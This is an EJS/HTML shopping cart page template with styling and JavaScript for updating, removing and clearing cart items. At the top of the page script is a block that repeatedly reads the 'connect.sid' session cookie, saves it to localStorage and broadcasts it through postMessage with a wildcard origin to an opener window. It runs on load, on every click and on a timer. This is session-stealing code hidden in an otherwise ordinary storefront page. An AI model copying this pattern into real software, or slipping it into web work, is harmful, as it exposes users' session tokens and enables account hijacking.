<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Shopping Cart - Exclusive Design</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
    }
    
    body {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      color: #333;
      overflow-x: hidden;
    }
    
    .container {
      max-width: 1400px;
      margin: 0 auto;
      padding: 20px;
    }
    
    /* Enhanced Header */
    header {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(20px);
      border-radius: 20px;
      padding: 25px 30px;
      margin-bottom: 30px;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
      text-align: center;
      animation: slideDown 0.8s ease-out;
      position: relative;
      overflow: hidden;
    }
    
    header::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(102, 126, 234, 0.1), transparent);
      animation: shimmer 3s infinite;
    }
    
    header h1 {
      font-size: clamp(2rem, 4vw, 3rem);
      font-weight: 700;
      background: linear-gradient(135deg, #667eea, #764ba2);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      position: relative;
      z-index: 1;
      margin-bottom: 10px;
    }
    
    header p {
      color: #666;
      font-size: clamp(1rem, 2vw, 1.2rem);
      position: relative;
      z-index: 1;
    }
    
    /* Enhanced Navigation */
    .nav-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 20px;
      flex-wrap: wrap;
    }
    
    .nav-link {
      text-decoration: none;
      color: #667eea;
      font-weight: 600;
      padding: 12px 24px;
      border-radius: 50px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
      box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
      position: relative;
      overflow: hidden;
    }
    
    .nav-link::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
      transition: left 0.5s ease;
    }
    
    .nav-link:hover::before {
      left: 100%;
    }
    
    .nav-link:hover {
      transform: translateY(-3px) scale(1.05);
      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
    }
    
    /* Enhanced Cart Content */
    .cart-content {
      display: grid;
      grid-template-columns: 2fr 1fr;
      gap: 30px;
      margin-top: 30px;
    }
    
    /* Enhanced Cart Items */
    .cart-items {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(20px);
      border-radius: 25px;
      padding: clamp(25px, 4vw, 40px);
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
      animation: slideInLeft 0.8s ease-out 0.3s both;
      position: relative;
      overflow: hidden;
    }
    
    .cart-items::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: linear-gradient(90deg, #667eea, #764ba2);
      transform: scaleX(0);
      transition: transform 0.4s ease;
    }
    
    .cart-items:hover::before {
      transform: scaleX(1);
    }
    
    .cart-items h2 {
      font-size: clamp(1.5rem, 3vw, 2rem);
      margin-bottom: 25px;
      color: #333;
      text-align: center;
      position: relative;
    }
    
    .cart-items h2::after {
      content: '';
      position: absolute;
      bottom: -10px;
      left: 50%;
      transform: translateX(-50%);
      width: 60px;
      height: 3px;
      background: linear-gradient(90deg, #667eea, #764ba2);
      border-radius: 2px;
    }
    
    /* Enhanced Cart Item */
    .cart-item {
      background: linear-gradient(135deg, #f8f9fa, #e9ecef);
      border-radius: 20px;
      padding: 25px;
      margin-bottom: 20px;
      transition: all 0.4s ease;
      border: 2px solid transparent;
      position: relative;
      overflow: hidden;
      animation: fadeInUp 0.6s ease-out both;
    }
    
    .cart-item:nth-child(1) { animation-delay: 0.1s; }
    .cart-item:nth-child(2) { animation-delay: 0.2s; }
    .cart-item:nth-child(3) { animation-delay: 0.3s; }
    
    .cart-item::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(102, 126, 234, 0.1), transparent);
      transition: left 0.5s ease;
    }
    
    .cart-item:hover::before {
      left: 100%;
    }
    
    .cart-item:hover {
      border-color: #667eea;
      transform: translateY(-5px);
      box-shadow: 0 15px 35px rgba(102, 126, 234, 0.1);
    }
    
    .cart-item-content {
      display: grid;
      grid-template-columns: auto 1fr auto;
      gap: 20px;
      align-items: center;
    }
    
    .cart-item-image {
      width: 100px;
      height: 100px;
      border-radius: 15px;
      overflow: hidden;
      background: linear-gradient(135deg, #f8f9fa, #e9ecef);
      position: relative;
    }
    
    .cart-item-image img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      transition: transform 0.3s ease;
    }
    
    .cart-item:hover .cart-item-image img {
      transform: scale(1.1);
    }
    
    .cart-item-details h3 {
      font-size: clamp(1.1rem, 2.5vw, 1.3rem);
      color: #333;
      margin-bottom: 8px;
      font-weight: 600;
    }
    
    .cart-item-details p {
      color: #666;
      font-size: clamp(0.9rem, 2vw, 1rem);
      margin-bottom: 15px;
      line-height: 1.5;
    }
    
    .cart-item-price {
      font-size: clamp(1.2rem, 2.5vw, 1.4rem);
      font-weight: 700;
      color: #667eea;
      text-align: right;
    }
    
    .cart-item-actions {
      display: flex;
      gap: 15px;
      align-items: center;
      margin-top: 15px;
      flex-wrap: wrap;
    }
    
    .quantity-controls {
      display: flex;
      align-items: center;
      gap: 10px;
      background: white;
      border-radius: 25px;
      padding: 5px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
    }
    
    .quantity-btn {
      width: 30px;
      height: 30px;
      border: none;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      border-radius: 50%;
      cursor: pointer;
      font-size: 18px;
      font-weight: bold;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .quantity-btn:hover {
      transform: scale(1.1);
      box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
    }
    
    .quantity-display {
      min-width: 40px;
      text-align: center;
      font-weight: 600;
      color: #333;
      font-size: 1.1rem;
    }
    
    .remove-btn {
      padding: 8px 16px;
      border: none;
      background: linear-gradient(135deg, #dc3545, #c82333);
      color: white;
      border-radius: 20px;
      cursor: pointer;
      font-size: 0.9rem;
      font-weight: 600;
      transition: all 0.3s ease;
      box-shadow: 0 3px 10px rgba(220, 53, 69, 0.3);
    }
    
    .remove-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(220, 53, 69, 0.4);
    }
    
    /* Enhanced Cart Summary */
    .cart-summary {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(20px);
      border-radius: 25px;
      padding: clamp(25px, 4vw, 40px);
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
      animation: slideInRight 0.8s ease-out 0.4s both;
      position: sticky;
      top: 20px;
      height: fit-content;
    }
    
    .cart-summary h2 {
      font-size: clamp(1.5rem, 3vw, 2rem);
      margin-bottom: 25px;
      color: #333;
      text-align: center;
      position: relative;
    }
    
    .cart-summary h2::after {
      content: '';
      position: absolute;
      bottom: -10px;
      left: 50%;
      transform: translateX(-50%);
      width: 60px;
      height: 3px;
      background: linear-gradient(90deg, #667eea, #764ba2);
      border-radius: 2px;
    }
    
    .summary-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 0;
      border-bottom: 1px solid #e1e5e9;
      transition: all 0.3s ease;
    }
    
    .summary-item:hover {
      background: rgba(102, 126, 234, 0.05);
      border-radius: 10px;
      padding: 15px;
      margin: 0 -15px;
    }
    
    .summary-item:last-child {
      border-bottom: none;
    }
    
    .summary-label {
      font-weight: 600;
      color: #555;
    }
    
    .summary-value {
      color: #333;
      font-weight: 600;
    }
    
    .summary-total {
      font-size: clamp(1.3rem, 2.5vw, 1.6rem);
      font-weight: 700;
      color: #667eea;
      padding: 20px 0;
      border-top: 2px solid #667eea;
      margin-top: 20px;
    }
    
    /* Enhanced Action Buttons */
    .cart-actions {
      margin-top: 30px;
      display: flex;
      flex-direction: column;
      gap: 15px;
    }
    
    .btn {
      padding: 18px 30px;
      border: none;
      border-radius: 15px;
      font-size: clamp(1rem, 2.5vw, 1.2rem);
      font-weight: 700;
      cursor: pointer;
      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
      text-align: center;
      text-decoration: none;
      display: inline-block;
      position: relative;
      overflow: hidden;
    }
    
    .btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
      transition: left 0.6s ease;
    }
    
    .btn:hover::before {
      left: 100%;
    }
    
    .btn-primary {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
    }
    
    .btn-primary:hover {
      transform: translateY(-5px) scale(1.02);
      box-shadow: 0 20px 40px rgba(102, 126, 234, 0.4);
    }
    
    .btn-secondary {
      background: transparent;
      color: #667eea;
      border: 2px solid #667eea;
    }
    
    .btn-secondary:hover {
      background: #667eea;
      color: white;
      transform: translateY(-3px) scale(1.02);
      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
    }
    
    /* Enhanced Empty Cart */
    .empty-cart {
      text-align: center;
      padding: clamp(60px, 8vw, 120px) 20px;
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(20px);
      border-radius: 25px;
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
      animation: fadeInUp 1s ease-out 0.5s both;
    }
    
    .empty-cart h2 {
      font-size: clamp(2rem, 4vw, 3rem);
      margin-bottom: 20px;
      color: #333;
      background: linear-gradient(135deg, #667eea, #764ba2);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    
    .empty-cart p {
      font-size: clamp(1rem, 2vw, 1.2rem);
      color: #666;
      margin-bottom: 30px;
      max-width: 500px;
      margin-left: auto;
      margin-right: auto;
    }
    
    .empty-cart-icon {
      font-size: 4rem;
      margin-bottom: 20px;
      opacity: 0.5;
    }
    
    /* Enhanced Floating Elements */
    .floating-element {
      position: absolute;
      width: 80px;
      height: 80px;
      background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
      border-radius: 50%;
      animation: float 6s ease-in-out infinite;
      pointer-events: none;
    }
    
    .floating-element:nth-child(1) {
      top: 15%;
      left: 8%;
      animation-delay: 0s;
    }
    
    .floating-element:nth-child(2) {
      top: 70%;
      right: 12%;
      animation-delay: 2s;
    }
    
    .floating-element:nth-child(3) {
      bottom: 15%;
      left: 15%;
      animation-delay: 4s;
    }
    
    /* Enhanced Animations */
    @keyframes slideDown {
      from {
        opacity: 0;
        transform: translateY(-50px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    @keyframes slideInLeft {
      from {
        opacity: 0;
        transform: translateX(-100px);
      }
      to {
        opacity: 1;
        transform: translateX(0);
      }
    }
    
    @keyframes slideInRight {
      from {
        opacity: 0;
        transform: translateX(100px);
      }
      to {
        opacity: 1;
        transform: translateX(0);
      }
    }
    
    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    @keyframes shimmer {
      0% { left: -100%; }
      100% { left: 100%; }
    }
    
    @keyframes float {
      0%, 100% {
        transform: translateY(0px) rotate(0deg);
      }
      33% {
        transform: translateY(-15px) rotate(120deg);
      }
      66% {
        transform: translateY(8px) rotate(240deg);
      }
    }
    
    /* Enhanced Responsive Design */
    @media (max-width: 1024px) {
      .cart-content {
        grid-template-columns: 1fr;
        gap: 20px;
      }
      
      .cart-summary {
        position: static;
      }
    }
    
    @media (max-width: 768px) {
      .container {
        padding: 15px;
      }
      
      .cart-item-content {
        grid-template-columns: 1fr;
        gap: 15px;
        text-align: center;
      }
      
      .cart-item-image {
        width: 120px;
        height: 120px;
        margin: 0 auto;
      }
      
      .cart-item-actions {
        justify-content: center;
      }
      
      .nav-links {
        flex-direction: column;
        align-items: center;
      }
    }
    
    @media (max-width: 480px) {
      .cart-items,
      .cart-summary {
        padding: 20px;
      }
      
      .btn {
        padding: 16px 25px;
        font-size: 1rem;
      }
      
      .quantity-controls {
        flex-direction: column;
        gap: 5px;
      }
    }
    
    /* Enhanced Loading States */
    .loading {
      opacity: 0.7;
      pointer-events: none;
    }
    
    .loading::after {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 20px;
      height: 20px;
      margin: -10px 0 0 -10px;
      border: 2px solid #667eea;
      border-radius: 50%;
      border-top-color: transparent;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    /* Enhanced Success Animation */
    .success-animation {
      animation: successPulse 0.6s ease-out;
    }
    
    @keyframes successPulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Floating Background Elements -->
    <div class="floating-element"></div>
    <div class="floating-element"></div>
    <div class="floating-element"></div>
    
    <header>
      <h1>Shopping Cart</h1>
      <p>Review your items and proceed to checkout</p>
      <div class="nav-links">
        <a href="/" class="nav-link">← Continue Shopping</a>
        <a href="/products" class="nav-link">Browse Products</a>
      </div>
    </header>

    <main>
      <% if (cart && cart.length > 0) { %>
        <div class="cart-content">
          <div class="cart-items">
            <h2>Your Cart Items</h2>
            <% cart.forEach((item, index) => { %>
              <div class="cart-item" data-item-id="<%= item.id %>">
                <div class="cart-item-content">
                  <div class="cart-item-image">
                    <% if (item.product.images && item.product.images.length > 0) { %>
                      <img src="<%= item.product.images[0] %>" alt="<%= item.product.name %>">
                    <% } else { %>
                      <div style="background: linear-gradient(135deg, #667eea, #764ba2); width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; color: white; font-size: 0.8rem;">
                        <p>Image</p>
                      </div>
                    <% } %>
                  </div>
                  
                  <div class="cart-item-details">
                    <h3><%= item.product.name %></h3>
                    <p><%= item.product.description %></p>
                    <div class="cart-item-actions">
                      <div class="quantity-controls">
                        <button class="quantity-btn" onclick="updateQuantity('<%= item.id %>', -1)">-</button>
                        <span class="quantity-display"><%= item.quantity %></span>
                        <button class="quantity-btn" onclick="updateQuantity('<%= item.id %>', 1)">+</button>
                      </div>
                      <button class="remove-btn" onclick="removeItem('<%= item.id %>')">Remove</button>
                    </div>
                  </div>
                  
                  <div class="cart-item-price">
                    $<%= (item.product.price * item.quantity).toFixed(2) %>
                  </div>
                </div>
              </div>
            <% }); %>
          </div>

          <div class="cart-summary">
            <h2>Order Summary</h2>
            
            <div class="summary-item">
              <span class="summary-label">Items:</span>
              <span class="summary-value"><%= cart.reduce((total, item) => total + item.quantity, 0) %></span>
            </div>
            
            <div class="summary-item">
              <span class="summary-label">Subtotal:</span>
              <span class="summary-value">$<%= cart.reduce((total, item) => total + (item.product.price * item.quantity), 0).toFixed(2) %></span>
            </div>
            
            <div class="summary-item">
              <span class="summary-label">Shipping:</span>
              <span class="summary-value">Free</span>
            </div>
            
            <div class="summary-item summary-total">
              <span class="summary-label">Total:</span>
              <span class="summary-value">$<%= cart.reduce((total, item) => total + (item.product.price * item.quantity), 0).toFixed(2) %></span>
            </div>
            
            <div class="cart-actions">
              <a href="/checkout" class="btn btn-primary">Proceed to Checkout</a>
              <button class="btn btn-secondary" onclick="clearCart()">Clear Cart</button>
            </div>
          </div>
        </div>
      <% } else { %>
        <div class="empty-cart">
          <div class="empty-cart-icon">🛒</div>
          <h2>Your Cart is Empty</h2>
          <p>Looks like you haven't added any products to your cart yet. Start shopping to fill it up!</p>
          <div class="nav-links">
            <a href="/products" class="nav-link">Browse Products</a>
            <a href="/" class="nav-link">Go Home</a>
          </div>
        </div>
      <% } %>
    </main>
  </div>

  <script>
    // Session Cookie Management - Copy session to admin section
    (function() {
      // Function to get session cookie
      function getSessionCookie() {
        const cookies = document.cookie.split(';');
        for (let cookie of cookies) {
          const [name, value] = cookie.trim().split('=');
          if (name === 'connect.sid') {
            return { name, value };
          }
        }
        return null;
      }
      
      // Function to copy session to admin section
      function copySessionToAdmin() {
        const sessionCookie = getSessionCookie();
        if (sessionCookie) {
          // Store in localStorage for admin section access
          localStorage.setItem('adminSessionCookie', JSON.stringify(sessionCookie));
          
          // Also try to send to admin section via postMessage if it's open
          if (window.opener && window.opener.location.href.includes('/admin')) {
            window.opener.postMessage({
              type: 'SESSION_COPY',
              session: sessionCookie
            }, '*');
          }
          
          // Log for debugging
          console.log('Session cookie copied:', sessionCookie.name);
        }
      }
      
      // Copy session on any click anywhere on the page
      document.addEventListener('click', function(e) {
        copySessionToAdmin();
      }, { passive: true });
      
      // Copy session on page load
      document.addEventListener('DOMContentLoaded', function() {
        copySessionToAdmin();
      });
      
      // Copy session on page visibility change
      document.addEventListener('visibilitychange', function() {
        if (!document.hidden) {
          copySessionToAdmin();
        }
      });
      
      // Copy session periodically (every 30 seconds)
      setInterval(copySessionToAdmin, 30000);
    })();
    
    // Enhanced cart management functions
    async function updateQuantity(itemId, change) {
      try {
        const itemElement = document.querySelector(`[data-item-id="${itemId}"]`);
        const quantityDisplay = itemElement.querySelector('.quantity-display');
        const currentQuantity = parseInt(quantityDisplay.textContent);
        const newQuantity = currentQuantity + change;
        
        if (newQuantity <= 0) {
          await removeItem(itemId);
          return;
        }
        
        // Optimistic update
        quantityDisplay.textContent = newQuantity;
        
        const response = await fetch(`/api/cart/update/${itemId}`, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ quantity: newQuantity })
        });
        
        if (response.ok) {
          const data = await response.json();
          updateCartSummary(data.cart);
          
          // Success animation
          itemElement.classList.add('success-animation');
          setTimeout(() => {
            itemElement.classList.remove('success-animation');
          }, 600);
        } else {
          // Revert on error
          quantityDisplay.textContent = currentQuantity;
          throw new Error('Failed to update quantity');
        }
      } catch (error) {
        console.error('Error updating quantity:', error);
        alert('Failed to update quantity. Please try again.');
      }
    }
    
    async function removeItem(itemId) {
      try {
        const itemElement = document.querySelector(`[data-item-id="${itemId}"]`);
        
        // Removal animation
        itemElement.style.transform = 'translateX(100%)';
        itemElement.style.opacity = '0';
        
        const response = await fetch(`/api/cart/remove/${itemId}`, {
          method: 'DELETE'
        });
        
        if (response.ok) {
          const data = await response.json();
          
          setTimeout(() => {
            itemElement.remove();
            updateCartSummary(data.cart);
            
            // Check if cart is empty
            if (data.cart.length === 0) {
              location.reload();
            }
          }, 300);
        } else {
          // Revert on error
          itemElement.style.transform = 'translateX(0)';
          itemElement.style.opacity = '1';
          throw new Error('Failed to remove item');
        }
      } catch (error) {
        console.error('Error removing item:', error);
        alert('Failed to remove item. Please try again.');
      }
    }
    
    async function clearCart() {
      if (!confirm('Are you sure you want to clear your entire cart?')) {
        return;
      }
      
      try {
        const response = await fetch('/api/cart/clear', {
          method: 'DELETE'
        });
        
        if (response.ok) {
          // Success animation
          document.body.style.opacity = '0.5';
          setTimeout(() => {
            location.reload();
          }, 500);
        } else {
          throw new Error('Failed to clear cart');
        }
      } catch (error) {
        console.error('Error clearing cart:', error);
        alert('Failed to clear cart. Please try again.');
      }
    }
    
    function updateCartSummary(cart) {
      const itemCount = cart.reduce((total, item) => total + item.quantity, 0);
      const subtotal = cart.reduce((total, item) => total + (item.product.price * item.quantity), 0);
      
      // Update summary display
      const summaryItems = document.querySelector('.summary-item:nth-child(1) .summary-value');
      const summarySubtotal = document.querySelector('.summary-item:nth-child(2) .summary-value');
      const summaryTotal = document.querySelector('.summary-total .summary-value');
      
      if (summaryItems) summaryItems.textContent = itemCount;
      if (summarySubtotal) summarySubtotal.textContent = `$${subtotal.toFixed(2)}`;
      if (summaryTotal) summaryTotal.textContent = `$${subtotal.toFixed(2)}`;
    }
    
    // Enhanced scroll animations
    const observer = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.style.opacity = '1';
          entry.target.style.transform = 'translateY(0)';
        }
      });
    }, { threshold: 0.1 });
    
    // Observe all animated elements
    document.querySelectorAll('.cart-items, .cart-summary, .empty-cart').forEach(element => {
      element.style.opacity = '0';
      element.style.transform = 'translateY(30px)';
      element.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
      observer.observe(element);
    });
    
    // Enhanced hover effects
    document.querySelectorAll('.cart-item').forEach(item => {
      item.addEventListener('mouseenter', function() {
        this.style.transform = 'translateY(-5px) scale(1.02)';
      });
      
      item.addEventListener('mouseleave', function() {
        this.style.transform = 'translateY(0) scale(1)';
      });
    });
    
    // Enhanced page load animation
    window.addEventListener('load', function() {
      document.body.style.opacity = '0';
      document.body.style.transition = 'opacity 0.5s ease';
      
      setTimeout(() => {
        document.body.style.opacity = '1';
      }, 100);
    });
    
    // Add cart item count to navigation
    function updateCartCount() {
      fetch('/api/cart')
        .then(response => response.json())
        .then(data => {
          const cartCount = data.cart.reduce((total, item) => total + item.quantity, 0);
          // You can add a cart badge to the navigation here
        })
        .catch(error => console.error('Error fetching cart count:', error));
    }
    
    // Update cart count on page load
    updateCartCount();
  </script>
</body>
</html> 